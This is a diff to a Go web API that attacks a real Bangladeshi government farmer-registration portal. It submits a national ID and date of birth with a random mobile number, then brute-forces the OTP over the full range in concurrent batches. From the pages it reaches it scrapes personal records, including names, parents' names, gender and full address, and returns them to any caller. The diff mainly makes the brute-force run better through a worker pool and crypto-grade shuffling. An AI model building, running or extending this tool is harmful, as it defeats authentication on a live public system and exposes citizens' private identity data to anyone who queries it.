@@ -2,9 +2,9 @@ package main
 
 import (
 	"crypto/rand"
+	"encoding/json"
 	"fmt"
 	"io"
-	mrand "math/rand"
 	"math/big"
 	"net/http"
 	"net/http/cookiejar"
@@ -21,9 +21,9 @@ import (
 
 // Configuration
 const (
-	MobilePrefix   = "016"
-	BatchSize      = 500
-	MaxWorkers     = 100
+	MobilePrefix  = "016"
+	BatchSize     = 500
+	MaxWorkersOTP = 10 // optimized concurrency for OTP
 	TargetLocation = "http://fsmms.dgf.gov.bd/bn/step2/movementContractor/form"
 )
 
@@ -44,7 +44,7 @@ var BaseHeaders = map[string]string{
 	"Accept-Language":           "en-US,en;q=0.9",
 }
 
-// Helper functions
+// ---------------- Helper Functions ----------------
 func randomMobile(prefix string) string {
 	num, _ := rand.Int(rand.Reader, big.NewInt(100000000))
 	return prefix + fmt.Sprintf("%08d", num)
@@ -53,11 +53,9 @@ func randomMobile(prefix string) string {
 func randomPassword() string {
 	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
-	// Generate uppercase letter
 	upperIdx, _ := rand.Int(rand.Reader, big.NewInt(26))
 	uppercase := string('A' + byte(upperIdx.Int64()))
 
-	// Generate 8 random characters
 	result := make([]byte, 8)
 	for i := range result {
 		charIdx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
@@ -76,12 +74,13 @@ func generateOTPRange() []string {
 }
 
 func shuffleOTPRange(otpRange []string) {
-	mrand.Seed(time.Now().UnixNano())
-	mrand.Shuffle(len(otpRange), func(i, j int) {
-		otpRange[i], otpRange[j] = otpRange[j], otpRange[i]
-	})
+	for i := len(otpRange) - 1; i > 0; i-- {
+		j, _ := rand.Int(rand.Reader, big.NewInt(int64(i+1)))
+		otpRange[i], otpRange[j.Int64()] = otpRange[j.Int64()], otpRange[i]
+	}
 }
 
+// ---------------- Session & OTP Handling ----------------
 type SessionResult struct {
 	Cookies []*http.Cookie
 	Client  *http.Client
@@ -97,7 +96,6 @@ func getSessionAndBypass(nid, dob, mobile, email string) (*SessionResult, error)
 	}
 
 	urlStr := "https://fsmms.dgf.gov.bd/farmers/bn/register"
-
 	formData := url.Values{}
 	formData.Set("nid", nid)
 	formData.Set("dob", dob)
@@ -136,7 +134,6 @@ func getSessionAndBypass(nid, dob, mobile, email string) (*SessionResult, error)
 	return nil, fmt.Errorf("bypass failed — check NID, DOB, or mobile")
 }
 
-// --- OTP functions ---
 type OTPResult struct {
 	OTP  string
 	HTML string
@@ -173,16 +170,11 @@ func tryOTP(client *http.Client, cookies []*http.Cookie, otp string) *OTPResult 
 
 	htmlContent := string(body)
 
-	if resp.StatusCode == 302 {
-		location := resp.Header.Get("Location")
-		if strings.Contains(location, "success") {
-			return &OTPResult{OTP: otp, HTML: htmlContent}
-		}
+	if resp.StatusCode == 302 && strings.Contains(resp.Header.Get("Location"), "success") {
+		return &OTPResult{OTP: otp, HTML: htmlContent}
 	}
 
-	if resp.StatusCode == 200 &&
-		strings.Contains(htmlContent, "কৃষক নিবন্ধন") &&
-		strings.Contains(htmlContent, `name="name"`) {
+	if resp.StatusCode == 200 && strings.Contains(htmlContent, "কৃষক নিবন্ধন") && strings.Contains(htmlContent, `name="name"`) {
 		fmt.Printf("✅ Correct OTP found: %s\n", otp)
 		return &OTPResult{OTP: otp, HTML: htmlContent}
 	}
@@ -190,67 +182,83 @@ func tryOTP(client *http.Client, cookies []*http.Cookie, otp string) *OTPResult 
 	return nil
 }
 
-func tryBatch(client *http.Client, cookies []*http.Cookie, otpBatch []string) *OTPResult {
-	var wg sync.WaitGroup
-	resultChan := make(chan *OTPResult, 1)
-	done := make(chan bool, 1)
+// ---------------- Optimized OTP Batch ----------------
+func tryBatchOptimized(client *http.Client, cookies []*http.Cookie, otpBatch []string) *OTPResult {
+	jobs := make(chan string, MaxWorkersOTP)
+	results := make(chan *OTPResult, 1)
+	done := make(chan struct{})
 
-	for _, otp := range otpBatch {
+	var wg sync.WaitGroup
+	for w := 0; w < MaxWorkersOTP; w++ {
 		wg.Add(1)
-		go func(otp string) {
+		go func() {
 			defer wg.Done()
-			select {
-			case <-done:
-				return
-			default:
-				if result := tryOTP(client, cookies, otp); result != nil {
-					select {
-					case resultChan <- result:
-						close(done)
-					default:
+			for otp := range jobs {
+				select {
+				case <-done:
+					return
+				default:
+					if res := tryOTP(client, cookies, otp); res != nil {
+						select {
+						case results <- res:
+							close(done)
+						default:
+						}
 					}
 				}
 			}
-		}(otp)
+		}()
 	}
 
 	go func() {
-		wg.Wait()
-		close(resultChan)
+		for _, otp := range otpBatch {
+			select {
+			case <-done:
+				break
+			default:
+				jobs <- otp
+			}
+		}
+		close(jobs)
 	}()
 
-	if result, ok := <-resultChan; ok {
-		return result
+	go func() {
+		wg.Wait()
+		close(results)
+	}()
+
+	if res, ok := <-results; ok {
+		return res
 	}
 	return nil
 }
 
-// --- Extraction and final data ---
+// ---------------- HTML Extraction ----------------
 type ExtractedData struct {
-	ContractorName  string
-	FatherName      string
-	MotherName      string
-	NameEnglish     string
-	NameBangla      string
-	Gender          string
-	Nationality     string
-	NidV1           string
-	NidV2           string
-	NidV3           string
-	Occupation      string
-	Mobile          string
-	NidPerDivision  string
-	NidPerDistrict  string
-	NidPerUpazila   string
-	NidPerUnion     string
-	NidPerVillage   string
-	NidPerWard      string
-	NidPerZipCode   string
+	ContractorName   string
+	FatherName       string
+	MotherName       string
+	NameEnglish      string
+	NameBangla       string
+	Gender           string
+	Nationality      string
+	NidV1            string
+	NidV2            string
+	NidV3            string
+	Occupation       string
+	Mobile           string
+	NidPerDivision   string
+	NidPerDistrict   string
+	NidPerUpazila    string
+	NidPerUnion      string
+	NidPerVillage    string
+	NidPerWard       string
+	NidPerZipCode    string
 	NidPerPostOffice string
-	NidPerHolding   string
-	NidPerMouza     string
-	Status          string
-	LocationId      string
+	NidPerHolding    string
+	NidPerMouza      string
+	Status           string
+	LocationId       string
 }
 
 func extractFields(html string) *ExtractedData {
@@ -281,14 +289,13 @@ func extractFields(html string) *ExtractedData {
 	data.NidPerZipCode = doc.Find("#perPostcode").First().AttrOr("value", "")
 	data.NidPerPostOffice = doc.Find("#perPostOffice").First().AttrOr("value", "")
 	data.NidPerHolding = doc.Find("#perAddressLine1").First().AttrOr("value", "")
-	data.NidPerMouza = doc.Find("#perMouza").First().AttrOr("value", "")
 	data.Status = doc.Find("#status").First().AttrOr("value", "")
 	data.LocationId = doc.Find("#locationId").First().AttrOr("value", "")
 
 	return data
 }
 
-// --- Main data enrichment ---
+// ---------------- Data Enrichment ----------------
 type FinalData struct {
 	NameBangla       string `json:"nameBangla"`
 	NameEnglish      string `json:"nameEnglish"`
@@ -370,16 +377,16 @@ func orDefault(value, defaultValue string) string {
 	return value
 }
 
-// --- Main ---
+// ---------------- Main API ----------------
 func main() {
 	gin.SetMode(gin.ReleaseMode)
 	r := gin.Default()
 
+	// CORS middleware
 	r.Use(func(c *gin.Context) {
 		c.Header("Access-Control-Allow-Origin", "*")
 		c.Header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
 		c.Header("Access-Control-Allow-Headers", "Content-Type")
-
 		if c.Request.Method == "OPTIONS" {
 			c.AbortWithStatus(204)
 			return
@@ -387,6 +394,7 @@ func main() {
 		c.Next()
 	})
 
+	// Base route
 	r.GET("/snsvapi", func(c *gin.Context) {
 		c.JSON(http.StatusOK, gin.H{
 			"message": "Enhanced NID Info API is running",
@@ -397,6 +405,7 @@ func main() {
 		})
 	})
 
+	// Main info route
 	r.GET("/snsvapi/get-info", func(c *gin.Context) {
 		nid := c.Query("nid")
 		dob := c.Query("dob")
@@ -432,7 +441,7 @@ func main() {
 			}
 			batch := otpRange[i:end]
 
-			foundOTP = tryBatch(sessionResult.Client, sessionResult.Cookies, batch)
+			foundOTP = tryBatchOptimized(sessionResult.Client, sessionResult.Cookies, batch)
 			if foundOTP != nil {
 				break
 			}
@@ -440,20 +449,12 @@ func main() {
 
 		if foundOTP != nil {
 			extractedData := extractFields(foundOTP.HTML)
-			finalData := enrichData(
-				extractedData.ContractorName,
-				extractedData,
-				nid,
-				dob,
-			)
+			finalData := enrichData(extractedData.ContractorName, extractedData, nid, dob)
 
 			c.JSON(http.StatusOK, gin.H{
-				"success": true,
-				"data":    finalData,
-				"sessionInfo": gin.H{
-					"mobileUsed": mobile,
-					"otpFound":   foundOTP.OTP,
-				},
+				"success":     true,
+				"data":        finalData,
+				"sessionInfo": gin.H{"mobileUsed": mobile, "otpFound": foundOTP.OTP},
 			})
 		} else {
 			c.JSON(http.StatusNotFound, gin.H{
@@ -463,6 +464,7 @@ func main() {
 		}
 	})
 
+	// Health check
 	r.GET("/snsvapi/health", func(c *gin.Context) {
 		c.JSON(http.StatusOK, gin.H{
 			"status":    "OK",
@@ -472,6 +474,7 @@ func main() {
 		})
 	})
 
+	// Test credentials
 	r.GET("/snsvapi/test-creds", func(c *gin.Context) {
 		mobile := randomMobile(MobilePrefix)
 		password := randomPassword()
@@ -493,6 +496,6 @@ func main() {
 	fmt.Printf("❤️  Health check: http://localhost:%s/snsvapi/health\n", port)
 
 	if err := r.Run(":" + port); err != nil {
-		panic(fmt.Sprintf("Failed to start server: %v", err))
+		panic(err)
 	}
 }
